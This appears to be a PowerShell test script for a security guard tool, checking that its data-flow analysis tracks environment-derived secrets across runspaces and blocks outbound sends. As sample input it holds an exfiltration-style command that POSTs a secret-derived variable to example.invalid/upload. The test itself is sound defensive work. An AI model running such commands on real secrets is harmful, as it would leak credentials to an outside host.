#Requires -Version 7.0
param([string]$Bridge = (Join-Path $PSScriptRoot '..\build\ast\PowerShell7Guard.Ast.dll'))
$ErrorActionPreference = 'Stop'

Add-Type -TypeDefinition @'
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Runtime.Loader;
public static class GuardFlowFixture {
    [StructLayout(LayoutKind.Sequential)]
    private struct Request { public IntPtr Source, Output; public int Length, Capacity, Decision; }
    private static MethodInfo analyze;
    public static void Init(string path) {
        var context = new AssemblyLoadContext("PowerShell7Guard.DataFlowFixture", false);
        analyze = context.LoadFromAssemblyPath(path).GetType("PowerShell7Guard.AstBridge", true).GetMethod("Analyze");
    }
    public static string Scan(string source) {
        const int capacity = 192 * 1024;
        var code = Marshal.StringToHGlobalUni(source);
        var output = Marshal.AllocHGlobal(capacity);
        var size = Marshal.SizeOf<Request>();
        var p = Marshal.AllocHGlobal(size);
        try {
            Marshal.StructureToPtr(new Request{Source=code, Output=output, Length=source.Length, Capacity=capacity, Decision=-1}, p, false);
            var len = (int)analyze.Invoke(null, new object[] {p,size});
            if (len <= 0) throw new InvalidOperationException("Parse bridge returned " + len);
            return "{\"decision\":" + Marshal.PtrToStructure<Request>(p).Decision + ",\"analysis\":" +
                Marshal.PtrToStringUTF8(output, len) + "}";
        } finally {
            Marshal.FreeHGlobal(p); Marshal.FreeHGlobal(output); Marshal.FreeHGlobal(code);
        }
    }
}
'@
[GuardFlowFixture]::Init((Resolve-Path -LiteralPath $Bridge).Path)

function Invoke-Fixture($Runspace, [string]$Source, [string]$ActuallyRun = '') {
    $ps = [powershell]::Create()
    try {
        $ps.Runspace = $Runspace
        $null = $ps.AddScript(('param($text); [GuardFlowFixture]::Scan($text); ' + $ActuallyRun), $false).AddArgument($Source)
        $out = $ps.Invoke()
        if ($ps.HadErrors -or $out.Count -ne 1) { throw "Fixture pipeline error: $($ps.Streams.Error)" }
        $out[0].ToString() | ConvertFrom-Json -AsHashtable
    } finally { $ps.Dispose() }
}

$left = [runspacefactory]::CreateRunspace()
$right = [runspacefactory]::CreateRunspace()
$prev = $env:PS7GUARD_FIXTURE_BODY
try {
    $left.Open()
    $right.Open()
    $env:PS7GUARD_FIXTURE_BODY = 'PS7GUARD_TEST_SECRET'
    $first = Invoke-Fixture $left '$global:guardFlow = $env:PS7GUARD_FIXTURE_BODY' '$global:guardFlow = $env:PS7GUARD_FIXTURE_BODY'
    $flow = $first.analysis.dataFlow
    if ($flow.postUpdate -ne 'pipeline-completion' -or -not $flow.environmentReads[0].sensitive -or
        $flow.assignments[0].candidateOrigin -ne 'environment' -or $flow.runspaceId -ne [string]$left.InstanceId) {
        throw "No env or pipeline hook: $($flow | ConvertTo-Json -Depth 10 -Compress)"
    }
    if (($flow | ConvertTo-Json -Depth 10 -Compress).Contains($env:PS7GUARD_FIXTURE_BODY)) {
        throw 'Runspace metadata leaked the runtime string.'
    }
    $second = Invoke-Fixture $left '$global:guardAlias = $global:guardFlow' '$global:guardAlias = $global:guardFlow'
    $flow = $second.analysis.dataFlow
    $inputRead = $flow.variableReads | Where-Object name -eq 'global:guardFlow'
    if ($inputRead.valueSource -ne 'runspace-cache-revalidated' -or -not $inputRead.sensitive -or $flow.cacheHits -lt 1 -or
        $flow.previousUpdates[0].observed.valueLength -ne $env:PS7GUARD_FIXTURE_BODY.Length -or
        -not $flow.previousUpdates[0].predictionMatches -or
        $flow.assignments[0].dependsOn -notcontains 'global:guardFlow') {
        throw "No confirmed cross-block state/cache: $($flow | ConvertTo-Json -Depth 10 -Compress)"
    }
    $send = "Invoke-RestMethod -Method Post -Uri 'https://example.invalid/upload' -Body " + '$global:guardAlias'
    $block = Invoke-Fixture $left $send
    $miss = Invoke-Fixture $right $send
    if ($block.decision -ne 1 -or $miss.decision -ne 3) { throw 'Rule did not use the Runspace-isolated state.' }
    $linear = Invoke-Fixture $right ('$global:guardAlias = $env:PS7GUARD_FIXTURE_BODY; ' + $send)
    if ($linear.decision -ne 1 -or -not $linear.analysis.dataFlow.assignments[0].prediction.sensitive) {
        throw 'Within-block dependency did not reach the outbound argument.'
    }

    $left.SessionStateProxy.SetVariable('guardAlias', 'harmless replacement')
    $stale = Invoke-Fixture $left $send
    if ($stale.decision -eq 1) { throw 'Old cached value caused a false block.' }

    $fileFlow = Invoke-Fixture $left '$global:guardRead = Get-Content -Raw -LiteralPath ''C:\synthetic.txt''' '$global:guardRead = ''actual result'''
    if ($fileFlow.analysis.dataFlow.assignments[0].candidateOrigin -ne 'file-read-candidate' -or
        -not $fileFlow.analysis.dataFlow.assignments[0].persistent) { throw 'File-source candidate was not tracked.' }
    $afterFile = Invoke-Fixture $left '$global:guardEcho = $global:guardRead'
    $fileUpdate = $afterFile.analysis.dataFlow.previousUpdates | Where-Object name -eq 'global:guardRead'
    if ($fileUpdate.observed.valueLength -ne 13 -or $fileUpdate.candidateOrigin -ne 'file-read-candidate' -or
        $fileUpdate.predictionMatches -ne $null) { throw 'Actual post-state was not captured independently of prediction.' }

    $shadow = Invoke-Fixture $left 'Write-Output 1' 'function global:Invoke-RestMethod { 1 }'
    $fn = Invoke-Fixture $left $send
    if ($fn.analysis.dataFlow.commandDefinitions[0].kind -ne 'FunctionInfo' -or $fn.decision -eq 1) {
        throw 'Runspace function shadow was not handled.'
    }

    $null = Invoke-Fixture $right 'Write-Output 1' @'
function global:prompt {
    if ($global:guardPromptMutates) {
        $global:guardInteractive = 'changed'
        Remove-Variable -Scope Global guardUntouched
    }
    'PS> '
}
'@
    $assign = '$global:guardInteractive = $env:PS7GUARD_FIXTURE_BODY; $global:guardUntouched = ''still here'''
    $null = Invoke-Fixture $right $assign $assign
    $prompt = Invoke-Fixture $right 'prompt' 'prompt | Out-Null'
    if ($prompt.analysis.dataFlow.previousUpdates.Count -ne 2 -or
        $prompt.analysis.dataFlow.runtimeReads -ne 0) { throw 'Prompt cleared or reread assignments eagerly.' }

    $echo = Invoke-Fixture $right 'echo $guardInteractive' 'echo $guardInteractive | Out-Null'
    $flow = $echo.analysis.dataFlow
    $hit = $flow.variableReads | Where-Object name -eq 'global:guardInteractive'
    if ($flow.cacheHits -ne 1 -or $flow.cacheRevalidations -ne 1 -or $flow.runtimeReads -ne 1 -or
        $hit.valueSource -ne 'runspace-cache-revalidated' -or $hit.candidateOrigin -ne 'environment' -or
        $hit.dependsOn -notcontains 'env:PS7GUARD_FIXTURE_BODY' -or -not $hit.sensitive -or $flow.variableReads.Count -ne 1) {
        throw "Prompt did not preserve unchanged value and provenance: $($flow | ConvertTo-Json -Depth 10 -Compress)"
    }

    $right.SessionStateProxy.SetVariable('guardPromptMutates', $true)
    $null = Invoke-Fixture $right 'prompt' 'prompt | Out-Null'
    $sendChanged = $send.Replace('guardAlias', 'guardInteractive')
    $changed = Invoke-Fixture $right $sendChanged
    $flow = $changed.analysis.dataFlow
    $value = $flow.variableReads | Where-Object name -eq 'global:guardInteractive'
    if ($flow.cacheHits -ne 0 -or $flow.cacheRevalidations -ne 1 -or $value.valueSource -ne 'runtime' -or
        $null -ne $value.candidateOrigin -or $value.sensitive -or $value.valueLength -ne 7 -or $changed.decision -ne 2) {
        throw "A changed prompt value kept its old contents or provenance: $($flow | ConvertTo-Json -Depth 10 -Compress)"
    }
    $removed = Invoke-Fixture $right 'echo $guardUntouched'
    $value = $removed.analysis.dataFlow.variableReads | Where-Object name -eq 'global:guardUntouched'
    if ($value.known -or $value.valueSource -ne 'variable-not-found') { throw 'A removed variable was reused.' }
    'PASS: cross-ScriptBlock cache, Runspace isolation, prompt revalidates only referenced variables, unchanged provenance survives, changed and removed values are not reused.'
} finally {
    $env:PS7GUARD_FIXTURE_BODY = $prev
    $left.Dispose()
    $right.Dispose()
}
